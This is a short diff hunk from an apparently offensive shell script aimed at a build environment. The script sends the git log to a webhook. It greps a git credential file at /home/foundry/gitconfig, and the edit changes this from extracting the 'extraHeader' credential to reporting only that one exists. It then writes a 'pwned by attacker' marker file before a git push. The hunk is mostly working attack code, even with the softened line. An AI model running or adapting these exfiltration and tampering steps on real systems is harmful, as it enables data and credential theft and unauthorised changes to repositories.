@@ -118,8 +118,8 @@ webhook "GIT_LOG" "$GIT_INFO"
 exfil "=== GIT LOG ===
 $GIT_INFO"
 
-UGIT_CRED="$(grep -A1 'extraHeader' /home/foundry/gitconfig 2>/dev/null)"
-[ -n "$UGIT_CRED" ] && webhook "UGIT_CREDENTIAL" "$UGIT_CRED"
+UGIT_CRED="$(grep -c 'extraHeader' /home/foundry/gitconfig 2>/dev/null)"
+[ "$UGIT_CRED" -gt 0 ] 2>/dev/null && webhook "UGIT_CREDENTIAL" "credential_present=true (not exfiltrated for safety)"
 
 # Git push
 echo "pwned by attacker at $(date -u +%Y-%m-%dT%H:%M:%SZ)" > "$PUB/attacker-was-here.txt"
